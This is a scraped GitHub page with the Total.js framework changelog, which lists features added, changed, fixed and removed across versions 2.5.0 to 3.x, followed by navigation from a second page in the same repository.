- added: CSS variables support default values `border-radius: $radius || 10px`- added: NoSQL storage `.find(beg, end, [threads])` + `.count(beg, end, [threads])` + '.scalar(beg, end, type, field, [threads])' with multiple thread support- added: `U.reader()`- added: `bundles` supports merging files between bundle and project, project file must start with e.g. `--name.js`- added: `.bundlesignore` support with similiar functionality like `.gitignore`- added: support for `SameSite` cookie attribute- added: `RUN()` for executing multiple Total.js operations- added: a new global alias `CONF` (it's a reference to config) for `F.config`- added: a new global alias `FUNC` (it's a reference to functions) for `F.functions`- added: `DatabaseBuilder.arg(key, value)` for adding an dynamic argument- added: NOSQL/TABLE modify supports `!field` as boolean toggle- added: NOSQL/TABLE modify supports a new type `$age: 'js\_code'` with some JS code- added: NOSQL/TABLE update supports a new type `'js\_code'` with some JS code- added: a new config item `default-restbuilder-timeout : 10000`- added: a new config item `default-cors : https://www.totaljs.com, https://www.componentator.com` which allows originators for `CORS()` method- added: a new config item `default-request-maxkeys : 33` for restricting query max. keys- added: a new config item `logger : false` which enables logging for Middleware, Schemas and Operations- added: a new config item `bundling : shallow` which enables shallow bundling (if `bundle.json` exists then the bundles won't be extracted)- added: `SchemaOptions` and `OperationOptions` supports `$.cancel()` method- added: `CACHE(name, [value], [expire], [persistent])` alias for `F.cache.get2()` and `F.cache.set()` or `F.cache.set2()`- added: encryption of config values- added: `F.refresh()` for refreshing of internal cache- added: `DatabaseBuilder.each(fn)` for browsing of evaluated records- added: Bundles can be downloaded from URL addresses- added: `ONCE()` alias to `F.once()`- added: `image.define(value)` performs `convert -define 'value'`- added: Total.js JS files (+ packages) tarted with `.` (dot) or ended with `-bk` won't be processed- added: A new builder called `TaskBuilder` for creating custom tasks in Schemas or Operations- added: `WebSocket.send2(message, [comparer(client, message)], [replacer])` a new method for better sending frames- addde: `PATH` as a global alias for `F.path`
- updated: `debug` mode creates a `start\_name\_script.pid` instead of `debug.pid`- updated: `NEWOPERATION()` supports `repeat`, `stop` and `binderror` arguments (more in docs)- updated: routing, now it supports operations in the form `ROUTE('.. \* --> @save\_operation @load\_operation (response)')`- updated: `ROUTE()` supports multiple HTTP method declaration `ROUTE('GET,POST,PUT /something/', action)`- updated: `ROUTE()` supports dynamic schemas- updated: `REQUEST()` can return binary data if the content-type is not `text/\*` or `application/\*`- updated: NoSQL joins support array values- updated: `ROUTING(id:|search, [flags])` method- updated: `F.path.mkdir(path, [cache])` can cache a current satte (default: false)- updated: `controller.all()` can return `Array` of all WebSocketClient- updated: startup info by adding user name- updated: `LOCALIZE()` now `url` arg can be a function which replaces `F.onLocale`
- fixed: a critical bug with storing uploaded files via `httpfile.fs()` or `httpfile.nosql()`- fixed: a critical bug with JavaScript minificator- fixed: a critical bug with NoSQL counter and freezing app- fixed: a critical bug with rendering of multiple async components- fixed: a critical bug with GZIP compression (sometimes appeared in Safari)- fixed: `nosql.update()` and `nosql.modify()` methods if the first argument is a function- fixed: `F.wait()` in the test mode- fixed: `LOCALIZE()` for nested directories- fixed: sending of error handling when WebSocketClient is starting (for example: `unauthorized`)- fixed: `versions` and `auto` feature with enabled `F.wait()`- fixed: `versions` and `auto` feature with direct link to file- fixed: `LOAD('release')` a release mode- fixed: `SchemaInstance.$clean()` for nested schemas- fixed: extracting `bundles` (added `/flow/` and `/dashboard/`)- fixed: subdomain routing for `localhost`- fixed: service for database cleaner- fixed: rendering group of components- fixed: RESTBuilder - JSON request without param sends an empty object- fixed: `$MAKE()` with `callback`- fixed: `String.slug()` for UTF - Chinese/Japan/Arabic/etc. chars- fixed: async rendering of `components`- fixed: RESTBuilder cache works only if the response status is `200`- fixed: compressing CSS with `\t` tabs- fixed: `controller.autoclear()`- fixed: `controller.proxy()`- fixed: `repeat` mode in `SCHEDULE()`- fixed: `--inspect` argument for Workers by Tema Smirnov- fixed: TLS in SMTP mail sender- fixed: applying of versions- fixed: unit-tests reads only `javascript` files- fixed: `controller.invalid()` a problem with ErrorBuilder as a argument
- removed: `F.config.debug`- removed: `controller.isDebug`
- improved: NoSQL reader- improved: `UID()` -> now it changes a random hash each minute- improved: CORS- improved: rendering of components
======= 3.0.0
- added: (IMPORTANT) bundles- added: (IMPORTANT) Total.js components can have async delegate- added: (IMPORTANT) Total.js components support nested public files encoded in base64- added: (IMPORTANT) NoSQL worker- added: (IMPORTANT) NoSQL embedded storage for smaller big data / IoT- added: `debugging` supports live reloading- added: new schema operations: `schema.setInsert()` and `schema.setUpdate()`- added: `RESTBuilder.patch([data])`- added: `RESTBuilder.type(new-content-type)`- added: `CONVERT(obj, schema)` for quick converting values like Schema (more in docs.)- added: `Capitalize2` schema type which converts only the first char- added: `MailMessage.high()` sets `high` priority of the email messsage- added: `MailMessage.low()` sets `low` priority of the email messsage- added: `MailMessage.confidential()` sets `Sensitivity` header with `confidential` value- added: `MailMessage.attachmentnosql(db, id, [name])` sends a file from NoSQL embedded database- added: `MailMessage.attachmentfs(storage\_name, id, [name])` sends a file from FileStorage- added: `SchemaBuilderEntity.$stop()` stops the async list- added: `SchemaOptions.stop()` alias to `$.model.$stop()`- added: `SchemaOptions.next()` alias to `$.model.$next()`- added: `SchemaOptions.output()` alias to `$.model.$output()`- added: `SchemaOptions.clean()` alias to `$.model.$clean()`- added: `SchemaOptions.response()` alias to `$.model.$response([index])`- added: `SchemaOptions.$async(callback, [index])` alias to `$.model.$async()`- added: `SchemaOptions.$get([options], [callback])` alias to `$.model.$get()`- added: `SchemaOptions.$insert([options], [callback])` alias to `$.model.$insert()`- added: `SchemaOptions.$query([options], [callback])` alias to `$.model.$query()`- added: `SchemaOptions.$remove([options], [callback])` alias to `$.model.$remove()`- added: `SchemaOptions.$save([options], [callback])` alias to `$.model.$save()`- added: `SchemaOptions.$update([options], [callback])` alias to `$.model.$update()`- added: `SchemaOptions.$workflow(name, [options], [callback])` alias to `$.model.$workflow()`- added: `SchemaOptions.$transform(name, [options], [callback])` alias to `$.model.$transform()`- added: `SchemaOptions.$operation(name, [options], [callback])` alias to `$.model.$operation()`- added: `SchemaOptions.$hook(name, [options], [callback])` alias to `$.model.$hook()`- added: `SchemaOptions.stop()` alias to `$.model.$stop()`- added: a new route flag type `&group` something like `roles` but groups aren't evaluated- added: `route.groups` with defined groups- added: NoSQL `database.listing([view])` which generates a listing response- added: `DatabaseBuilder.insert(fn(doc))` can modify a document after `update` or `modify` has `insert` mode- added: `DatabaseBuilder.query(code)` can contain a raw JS condition in the form e.g. `doc.age > 18 && doc.age < 33`- added: `DatabaseBuilder.regexp(name, regexp)` RegExp search in strings- added: `DatabaseBuilder.fulltext(name, regexp, [weight])` full text search in strings, more info in docs.- added: `DatabaseBuilder.hour(name, [compare], value)` creates a condition for hours- added: `DatabaseBuilder.minute(name, [compare], value)` creates a condition for minutes- added: `Database.find2()` performs faster and reverse reading of documents (from end to begin of the file)- added: `Database.stream(fn, [repository], [callback(err, repository, count)])` for streaming documents- added: `Database.lock(callback(next))` locks all internal DB operations- added: `Database.ready(callback)` executes a callback when DB is ready to use (only for special cases if you use indexes)- added: new directory `schemas` with a new configuration item `directory-schemas'- added: new directory `operations` with a new configuration item `directory-operations'- added: `String.crc32([unsigned])`- added: `U.hash('crc32')` and `U.hash('crc32unsigned')`- added: config `nosql-worker' for enabling worker for NoSQL embedded database (default: `false`)- added: config `nosql-inmemory' can contain name of databases e.g. (`users, products`) or String Array- added: config `nosql-cleaner` for cleaning databases from removed documents (default: `1440` === 24 hours)- added: config `nosql-logger` (default `true`) enables simple logs when re-indexing and cleaning- added: config `security.txt` for auto-generating security.txt content (more in docs)- added: config `default-proxy` for default web proxy server- added: config `allow-cache-cluster` (default `true`) allow/disallow cache synchronization- added: `GUID()` a global alias for `U.GUID()`- added: `VIEW()` a global alias for `F.view()`- added: `SchemaBuilderEntity.$response([index])` returns a specific response from an operation in `async` queue- added: `$SAVE(schema, model, [options], [callback], [controller])` performs `schema.save()`- added: `$INSERT(schema, model, [options], [callback], [controller])` performs `schema.insert()`- added: `$UPDATE(schema, model, [options], [callback], [controller])` performs `schema.update()`- added: `$REMOVE(schema, [options], [callback], [controller])` performs `schema.remove()`- added: `U.streamer2()` same functionality as `U.streamer()` but it returns `Buffer` instead of `String`- added: `Number.round([precision])`- added: `UID([type])` supports custom types, e.g. `UID('users')` or `UID('orders')`- added: `REQUEST()` global method, it's alias to `U.request()`- added: `NOW` global property, it's alias to `F.datetime`- added: `DatabaseBuilder.promise()`- added: `RESTBuilder.promise()`- added: `RESTBuilder.plain()` it returns a raw string from the response body- added: `versions` file supports `auto` value for generating auto-checksum of files- added: `F.load()` supports `test`- added: NoSQL binary supports `custom` small data attributes- added: CSS and JS supports a simple View Engine markup (config + resources + F.global)- added: `controller.split` alias to `controller.req.split`- added: nicer error response messages- added: `RESTBuilder.proxy(proxy)` for HTTP proxy- added: `U.request()` supports a new flag `proxy`, for example `proxy 127.0.0.1:8080`- added: NoSQL database a new event `change`, more in docs- added: `schema.define()(DEFAULT\_VALUE)` added `DEFAULT\_VALUE`- added: `TESTUSER([user])` for faking of `F.onAuthorize` delegate, targeted for unit-testing only- added: `G` as a global alias for `F.global`- added: `ERROR([name])` is an improved `F.error()` without arguments- added: a simple support for `.heic` and `.heif` image format- added: `controller.sitemap\_url2()`- added: `controller.sitemap\_name2()`- added: `@{sitemap\_url2()}`- added: `@{sitemap\_name2()}`- added: `F.syshash` contains a simple MD5 hash with OS info- added: `SchemaEntity.clear()` for removing all current definition- added: new view engine markup `@{#}` for simulating of root URL- added: new view engine command `@{root}` for getting sub-root path- added: `String.ROOT()` for replacing `@{#}` markup in strings- added: `U.decryptUID(value, key)` for encrypting number/string values- added: `U.encryptUID(value, key)` for decrypting of number/string values- added: `F.config['secret-uid']` as a hidden secret for encrypting/decrypting values- added: `F.dir(path)` for changing of root directory- added: `NOSQL()/TABLE().memory(count, [size])` for memory consumption, more in docs- added: `HttpFile.fs(storage\_name, [custom], [callback])` saves a file into the FileStorage- added: `HttpFile.nosql(db\_name, [custom], [callback])` saves a file into the FileStorage- added: `res.filefs(storage\_name, id, [download], [headers], [callback])` returns file from FileStorage- added: `res.filenosql(db\_name, id, [download], [headers], [callback])` returns file from NoSQL binary- added: `res.imagefs(storage\_name, id, image\_make\_fn, [headers], [callback])` returns file from FileStorage- added: `res.imagenosql(db\_name, id, image\_make\_fn, [headers], [callback])` returns file from NoSQL binary- added: new stats `F.stats.performance` contains count of `request` and `file` per minute- added: new method `controller.operation(name, value, [callback], [options])` for evaluating of operation
- updated: (IMPORTANT) NoSQL binary divides files to independent directories for 1000 files per directory- updated: `GROUP()` by adding a new argument `url\_prefix`- updated: `NEWSCHEMA()` supports `NEWSCHEMA('group/name')`- updated: `ROUTE()`, extended syntax for schemas, for example: `Schema --> @name` (more in docs.)- updated: `ROUTE()` supports a new HTTP method definition `ROUTE('GET /api/users/')`, `ROUTE('POST /api/users/')`, etc.- updated: `ROUTE()` supports a schema definition directly in the URL `ROUTE('GET /api/users/ \*User --> @save')`, etc.- updated: `tpm` supports a new command called `bundle`, for example: `tpm bundle cms`- updated: `F.restore()` filter can return a new filename (for files only)- updated: `@{import('livereload')}` or `@{import('livereload wss://mywebsite.com')}` supports `livereload` value and it's rendered in `debug` mode only- updated: information after the framework is started- updated: `schema.define('name', null)` removes a schema field- updated: Chunker supports `compression`, default `true`- updated: Chunker supports `autoremove` processed files in `each()` or `read()` method, default `true`- updated: `String.parseConfig(def, [onError])` can handle errors better- updated: `middleware`, now Total.js supports new declaration `F.middleware(function($) {})`- updated: `F.wait()` HTML template- updated: JavaScript compressor, now optimizes multiple `var` declarations- updated: `CORS()` without arguments for all routes, methods and origins- updated: `CORS()` tries to join multiple same preferences to one- updated: `CORS(path)` without additional arguments allows all HTTP methods- updated: `U.keywords()` for Chinese/Japan characters- updated: `@{import()}` by adding `manifest` value linked to `/manifest.json`- updated: `F.use()` supports `function` instead of `middleware` name- updated: improved crypto algorithm- updated: decreased a maximum count of keys to `33` from `69` when the query string is parsing- updated: extended `schema.required(name, (model, workflow) => workflow.update)`, more in docs.- updated: `$MAKE(schema, model, [filter/workflows], ...)` supports `workflows` (array or object) instead of filter for `schema.required()`- updated: `OPERATION()` by adding `controller`
- fixed: mail attachments- fixed: mail `message.manually()`- fixed: WebSocket comparing of `origin` header- fixed: uninstalling CORS routes- fixed: cache for `favicon`- fixed: `Date.extend()`- fixed: `String.isJSON()` validator- fixed: `String.parseDate()` now it parses date to UTC correctly- fixed: `Date.format()` now it formats a date as UTC correctly- fixed: HTML compressor with `\r\n` (Windows line endings)- fixed: schema validation- fixed: `U.atob()`- fixed: `U.btoa()`- fixed: schema field can be changed dynamically- fixed: `String.arg()`- fixed: `controller.href()` with Array values- fixed: `U.get()` a problem with path with `-`- fixed: `U.set()` a problem with path with `-`- fixed: `F.path.mkdir()` in Windows and Linux
- replaced: config `disable-clear-temporary-directory` to `allow-clear-temp : true|false`- replaced: config `disable-strict-server-certificate-validation` to `allow-ssc-validation : true|false`- replaced: config `default-websocket-request-length` to `default-websocket-maxlength`- replaced: config `default-request-length` to `default-request-maxlength`- replaced: config `default-maximum-file-descriptors` to `default-maxopenfiles`- replaced: `controller.proxy()` functionality (the name remains) via `controller.proxy2()` functionality
- removed: `F.responseFile()`- removed: `F.responsePipe()`- removed: `F.responseImage()`- removed: `F.responseImageWithoutCache()`- removed: `F.responseStream()`- removed: `F.responseBinary()`- removed: `F.responseContent()`- removed: `F.responseRedirect()`- removed: `F.response400()`- removed: `F.response401()`- removed: `F.response404()`- removed: `F.response408()`- removed: `F.response431()`- removed: `F.response500()`- removed: `F.response501()`- removed: `F.responseStatic()`- removed: `F.setModified()`- removed: `F.notModified()`- removed: `F.responseCode()`- removed: `F.noCache()`- removed: `controller.$modified()`- removed: `controller.$etag()`
- improved: `debug` mode timing with improved consumption- improved: performance (+20%) NoSQL embedded database- improved: reading performance (+5%) in `U.streamer()`- improved: CSS compressor- improved: CORS processing- improved: internal encryption/decryption mechanism
======= 2.9.4 (HOTFIX)
- fixed: mail attachments- fixed: comparing `origin` header in WebSocket- fixed: unit-testing
======= 2.9.3 (HOTFIX)
- added: `String.arg(obj)` for a simple templating `Hello {variable}!`- added: new event `ON('@controllername', function() {})` -> is executed if the controller is evaluated
- updated: RESTBuilder default headers are lower-case- updated: `content-disposition` header by adding `utf-8` according to [RFC 5987](https://tools.ietf.org/html/rfc5987#section-3.2.2)
- fixed: a missing property `controller.params` in WebSocket controller- fixed: `$ASYNC()` execution in some cases- fixed: `SCRIPT()` code with comments- fixed: a callback reference in `OPERATION()`- fixed: cache after route is removed- fixed: `409` system route- fixed: requests with `range` header and bad values- fixed: `clearSchedule()`- fixed: `Date.extend()` problem with months- fixed: NoSQL counter reading stats
======= 2.9.2
- added: `controller.html(body, [headers])`- added: `F.cluster.master(name, [data])` - for child processes, this method emits an event in master process- added: `F.cluster.on(name, callback(data))` - master event listener- added: `LOGMAIL()` global alias for `F.logmail()`- added: `MAIL()` global alias for `F.mail()`- added: own implementation of `onFinished`- added: `RESTBuilder.cookies(obj)` can set cookies as raw object- added: `RESTBuilder.cook([true/false])` enables persistent cookies- added: `SchemaOptions.params` which returns dynamic params from the controller's action- added: `SchemaOptions.done([arg])` as a callback (contains wrapped SUCCESS())- added: `SchemaOptions.DB()` which returns `DB(this.error)` instance (for SQL Agent)- added: `OperationOptions.done([arg])` as a callback (contains wrapped SUCCESS())- added: `OperationOptions.DB()` which returns `DB(this.error)` instance (for SQL Agent)- added: static method `Image.measure(type, buffer)` for measuring width/height of image- added: `EACHOPERATION(function(name) {})` for obtaining all registered operations- added: `controller.params` which returns dynamic params from the action
- updated: `F.load()`, now supports `string` for `debug` or `release` mode- updated: `F.cluster.request()` can be executed from master process- updated: `Image.miniature()` change a default filter from `Box` to `Hamming`- updated: `U.request()` supports a new flag `cookies` which enables a parsing cookies from response
- fixed: schema validation (problem with Arrays)- fixed: determines `x-forwarded-proto`- fixed: nested schema validation- fixed: themes static routing- fixed: NoSQL reader- fixed: NoSQL counter (sorting while reading stats)- fixed: loading dependencies- fixed: uninstalling middleware- fixed: reading/updating sitemap in controller
- removed: max. sort `string` length- removed: `auto` appending `.css` and `.js` extension in view engine- removed: experimental `defer` feature
- improved: GZIP compression- improved: code
======= 2.9.1 (HOTFIX)
- added: `controller.throw409()`, `req.throw409()`- added: new view aliases: `@{R.something}` for `repository`, `@{M.something}` for `model` and `@{G.something}` for `global`
- updated: `ErrorBuilder.push()` supports `.push(name, status\_code)` or `.push(name, error, status\_code)`
- fixed: sitemap language auto-setting- fixed: NoSQL: `builder.paginate()` a problem with zero limit (default limit will be `maxlimit`)- fixed: NoSQL number filtering- fixed: localization of ErrorBuilder in controllers
======= 2.9.0
- added: `WebSocketClient`- added: `$ASYNC(schema, callback, [index], [controlller])` alias to `SchemaBuilderEntity.$async()`- added: `ArrayBuffer.prototype.toBuffer()`- added: `AUTH(fn)` is an alias to `F.onAuthorize = fn`- added: `controller.success()` alias to `controller.json(SUCCESS(value))`- added: `CORS()` alias to `F.cors()`- added: `DatabaseBuilder.paginate(page, limit)`- added: `F.config['allow-compile']` can disable the whole compilation of static files- added: `F.config['default-dependency-timeout']` it's a timeout for module dependencies- added: `F.path.rmdir(directory/directories, callback)`- added: `F.path.unlink(file/files, callback)`- added: `LOCALIZE()` a new global alias to `F.localize()`- added: `MAP()` a new global alias to `F.map()`- added: `MERGE()` a new global alias to `F.merge()`- added: `MIDDLEWARE()` a new global alias to `F.middleware()`- added: `NOSQL('users').backups([filter(doc)], callback(err, response))` returns all backups- added: `SchemaOptions.invalid(name, [value], [path], [index])` alias to `$.errors.push() + callback()`- added: `SchemaOptions.success()` alias to `callback(SUCCESS(value))`- added: `controller.sitemapid` contains a sitemap identifier- added: `controller.sitemap\_add(parent, name, url)` appends a new item into the sitemap per request- added: `@{sitemap\_add(parent, name, url)}` appends a new item into the sitemap per request- added: `SchemaEntity.required('fieldname', boolean/function(model))` which can disable/enable validation for this field
- updated: `sitemap` routing can contain an additional path, e.g. `#sitemapid/path/`- updated: `F.localize()` supports sitemap routing- updated: `F.merge()` supports sitemap routing- updated: `F.map()` supports sitemap routing- updated: `F.http(mode, [options], [middleware(listen)])` added a new argument `middleware`- updated: `debug.js` now reads directories according to the config (author: @luoage)- updated: config parser supports `config` sub-type- updated: `controller.$exec()` --> `callback` is by default `controller.callback()`- updated: `F.localize()` has enabled `compression` by default- updated: HTTP server is listening after the framework is completely loaded- updated: (IMPORTANT) HTTP cache in dynamic content and static files- updated: `F.prototypes()` by adding `OperationOptions`- updated: ErrorHandling in schemas (supports inline validation and advanced conditions)- updated: `F.noCache()` is obsolete
- renamed: `allow-handle-static-files` to `allow-static-files`
- fixed: (IMPORTANT) `DatabaseBuilder.in()`- fixed: (IMPORTANT) `U.ls2()`- fixed: (IMPORTANT) `WebSocket` implementation (author: @jozefgula)- fixed: `ArrayBuffer` in webosocket- fixed: `F.path.mkdir()` on Windows (author: @molda)- fixed: `F.restore()` on Windows (author: @molda)- fixed: `F.rmdir` removes all files and directories- fixed: `JSON` type in Total.js schemas- fixed: `MODEL()`, `MODULE()`, `INCLUDE()` now are direct aliases- fixed: a check for maximum length of request data- fixed: Date formatting with `a` value- fixed: empty localization in view engine e.g. `@()`- fixed: external static routing in view engine on Windows- fixed: NoSQL filtering with `or`- fixed: NoSQL multiple updates- fixed: NoSQL sorting of boolean values in larger dataset- fixed: responding on `range` header- fixed: unit testing (author: @ckpiggy)- fixed: `schema.setPrefix()` in nested schemas- fixed: sitemap localization- fixed: CORS custom headers- fixed: NoSQL date filtering
- improved: performance and security
======= 2.8.0
- added: `NOSQL().restore()` restores a database (its package)- added: Mail options support a new property `xoauth2` (it needs to contain a `BASE64` value) for sending emails via OAuth 2.0 tokens (more in docs)- added: `F.path.mkdir(path)` creates all directories according to the path- added: `MailMessage.send2([callback])` sends a message according to the framework configuration- added: a new filter for NoSQL embedded `DatabaseBuilder.contains(name)`- added: a new filter for NoSQL embedded `DatabaseBuilder.empty(name)`- added: (IMPORTANT) NoSQL counter supports daily stats (NoSQL counter files will be upgraded automatically and backwards incompatible)- added: (IMPORTANT) NoSQL database and counter can read data from URL- added: NoSQL counter `db.counter.daily\_sum([id], callback)` for reading stats- added: NoSQL counter `db.counter.daily\_max([id], callback)` for reading stats- added: NoSQL counter `db.counter.daily\_min([id], callback)` for reading stats- added: NoSQL counter `db.counter.monthly\_sum([id], callback)` for reading stats- added: NoSQL counter `db.counter.monthly\_max([id], callback)` for reading stats- added: NoSQL counter `db.counter.monthly\_min([id], callback)` for reading stats- added: NoSQL counter `db.counter.yearly\_sum([id], callback)` for reading stats- added: NoSQL counter `db.counter.yearly\_max([id], callback)` for reading stats- added: NoSQL counter `db.counter.yearly\_min([id], callback)` for reading stats- added: NoSQL counter `db.counter.stats\_sum(top, [year], [month], [day], callback)` for reading stats- added: NoSQL counter `db.counter.stats\_max(top, [year], [month], [day], callback)` for reading stats- added: NoSQL counter `db.counter.stats\_min(top, [year], [month], [day], callback)` for reading stats- added: NoSQL counter `db.counter.minimum([id], callback)` for reading stats- added: NoSQL counter `db.counter.maximum([id], callback)` for reading stats- added: NoSQL counter `db.counter.min(id, value)` for writing stats- added: NoSQL counter `db.counter.max(id, value)` for writing stats- added: NoSQL counter `db.counter.sum(id, value)` for writing stats (alias for `db.counter.hit()`)- added: NoSQL counter: a new event `stats` when the stats are changed- added: NoSQL logging in `DatabaseBuilder.log(msg, [user])`- added: NoSQL backuping documents while they are updating/removing in `DatabaseBuilder.backup([user])`- added: `CLONE(obj)` alias for `U.clone()`- added: `GROUP(flags, fn)` alias for `F.group()`- added: `F.cache.set2()` it creates a persistent cache (persistent items are stored in a file)- added: new View Engine command `@{'%config'}` which reads a value from config directly- added: `F.config['allow-filter-errors']` for filtering network unhandled errors- added: `REDIRECT()` alias for `F.redirect()`
- updated: (IMPORTANT) packages compress/decompress function supports streaming data- updated: (IMPORTANT) `NOSQL().backup()` !!! was changed !!!!- updated: `controller.view(name/url, [model], [headers], [partial])` can render a view from URL address- updated: `F.backup()` argument `path` can contain `String Array` file list- updated: `controller.viewCompile(body, model, [headers], [partial], [cacheKey])` add a cache key- updated: `image.command(arg, value, [priority], [escape])` a `priority` argument can be `escape` when it contains `boolean` value- updated: `U.getExtension()` returns lower-case extensions- updated: `total.js/debug` watchs `/workflows` file- updated: file `/workflows` supports custom `options`, more in docs- updated: `Array.random()` algorithm (+70% faster than older)- updated: `RESTBuilder.file(name, filetarget, [filename])` can contain `filename` instead of buffer- updated: `U.streamer(beg, [end], onItem(item, index), [skip], [stream])` added a new argument `stream` for flushing buffer- updated: `ErrorBuilder.addTransform(name, callback(isResponse))` by adding new argument `isresponse`- updated: `sorting` (framework + NoSQL embedded), now supports `internationalization`- updated: `total.js/debugger` by adding a new option `options.watch = ['directory']`- updated: `U.streamer()` supports "cancelation", just return `false`- updated: CSS auto-prefixer, added: `repeating-linear-gradient`, `radial-gradient`, `repeating-radial-gradient` and removed `-o` prefix
- fixed: (IMPORTANT) long messages in WebSocket- fixed: (IMPORTANT) `controller` param in schemas- fixed: moved executing of `MailMessage.callback()` to better place- fixed: mail auth when `options.user` and `options.password` are blank- fixed: JS/CSS/HTML blocks- fixed: `F.prototypes()`- fixed: `F.decrypt()` a problem with parsing JSON and date formats- fided: `debug.js` sometimes was created a problem with output informations
- improved: Date formatting (+50%)- improved: NoSQL performance (around 60% in some cases)
======= 2.7.0
- added: \_\_IMPORTANT\_\_ new unit-testing mechanism- added: \_\_IMPORTANT\_\_ `F.prototypes(function(proto) {})` for extending all internal prototypes- added: `HttpFile` is set in `global` for extending of prototype- added: `file.move()` a new alias for `file.rename()`- added: `SchemaBuilderEntity.$controller(new\_controller)`- added: `EMPTYCONTROLLER` is a global variable- added: new alias `NOSQL.set()` and `NOSQL.get()` for `NOSQL.meta()`- added: `RESTBuilder.file(name, filename, [buffer])` supports uploading files- added: `RESTBuilder.mobile()` adds `iPhone` phrase into the `User-Agent` header- added: `RESTBuilder.robot()` adds `Bot` phrase into the `User-Agent` header- added: a small protection for multipart data- added: a new global aliases `ROUTE()` --> `F.route()`, `FILE()` --> `F.file()` and `WEBSOCKET()` --> `F.websocket()`
- updated: \_\_IMPORTANT\_\_ components (framework can render css/js from specific group)- updated: `F.cluster` each operation checks whether cluster is activated- updated: default IP to `0.0.0.0`- updated: `Date.prototype.format()` with `ddd` renders name of day with 2 capital letters
- fixed: new schemas with defined callback `function($)`- fixed: loading of `config-test` file (added rewriting of existing values)- fixed: Total.js version in `debug.js`- fixed: cluster initialization
- improved: `cors` in `F.restful()` and `F.restful2()`- improved: `auto-vendor-prefixes`- improved: parsing files from multipart data
======= 2.6.2 (HOTFIX)
- fixed: a critical bug with `debug.js`- fixed: `try/catch` block from parsing of WebSocket message
======= 2.6.1 (HOTFIX)
- fixed: timeout in `RESTBuilder` and `U.request()`- fixed: `F.merge()` a problem with `.js` or `.css` extension in some directory
======= 2.6.0
- added: `F.config['default-errorbuilder-status']` a default HTTP status for all error builders default `200`- added: `F.config['default-listenpath']` starts a UNIX socket server listening for connections on the given path- added: `F.listenpath` contains `default-listenpath` location- added: `F.custom(mode, http, request\_prototype, response\_prototype, options)` a new mode for overwriting default HTTP server- added: `schema.inherit([group], name)` can inherit all values from another schema- added: NoSQL synchronization for cluster (more in docs)- added: cache synchronization for cluster (more in docs)- added: `F.cluster` (more in docs)- added: Total.js `debug` script `require('total.js/debug')` instead of `debug.js` file- added: a support for `async` attribute when `<script async src="` tag is generating, e.g. `@{import('async default.js')}`
- updated: `F.http(type, options)` supports `options.listenpath` for HTTP server (a direct shortcut for `default-listenpath`)- updated: `F.script` returns error if compilation fails- updated: `debug.js` supports `inspector`- updated: NoSQL embedded database sorting (increased read performance about 30%)- updated: RESTBuilder parsers JSON date string as `Date` object- updated: `favicon()` generates `<link rel="icon"` instead of `<link rel="shortcut icon"`
- fixed: `controller.send()` bad declaration of `connection.id` for `id` and `blacklist` arguments- fixed: `totaljs --translate` problem with `node\_modules` and `.git` directory- fixed: a waiting mode in `GETSCHEMA()`- fixed: cache `instance.cache()` in RESTBuilder- fixed: NoSQL filtering (critical)- fixed: a bug ImageMagick/GraphicsMagick when the path contains spaces (critical)- fixed: `controller.memorize()` didn't work (critical)- fixed: dynamic params when `controller.transfer()` is performed
======= 2.5.0
- added: a missing property for WebSocket controller `controller.mobile`- added: `EMIT()` alias for `F.emit()`- added: `ON()` alias for `F.on()`- added: `OFF()` alias for `F.removeListener(eventName, listener)` or `F.removeAllListeners([eventName])`- added: `controller.components()` adds script/css tag into the head- added: `@{components([group], [settings])}` renders all components together from selected group- added: a new alias `WAIT()` alias for `U.wait()`- added: `res.status(code)` for express middleware- added: `F.clearSchedule(id)` for removing existing schedules- added: a support for WebSocket compression- added: removing `.package` files from `tmp` directory- added: a new schema implementation (more in docs)- added: `F.restful2()` has simplified route mechanism (it doesn't use "{id}" param for insert(POST)/update(POST)/delete(DELETE) method with except "GET" method)- added: `res.binary(buffer, contentType, [type], [download], [headers])`- added: a new route flag `novalidate` (a prevention for Schema validation)- added: `U.upload(files, url, [callback], [cookies], [headers], [method], [timeout])` for multiple uploading files- added: `RESTBuilder.redirect(true/false)` enables/disables auto-redirect (default: enabled)- added: new schema aliases (`$QUERY()`, `$GET()`, `$WORKFLOW()`, '$TRANSFORM()' and `$OPERATION()`)- added: `allow-head` (default: false) adds `head` method into the each route automatically- added: `F.config['allow-defer']` enables deferring functions with `DEFER` keyword (default: false)- added: `DEFER` feature- added: `F.config['allow-debug']` starts a mini debugger- added: `res.image\_nocache()` alternative to `F.responseImageWithoutCache`[View remainder of file in raw view](https://github.com/totaljs/framework/raw/e644167d5378afdc45cb0156190349b2c07ef235/changes.txt)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_5e99c99c_20250114_205929.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftotaljs%2Fframework%2Fcommit%2F887b0fa9e162ef7a2dd9cec20a5ca122726373b3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
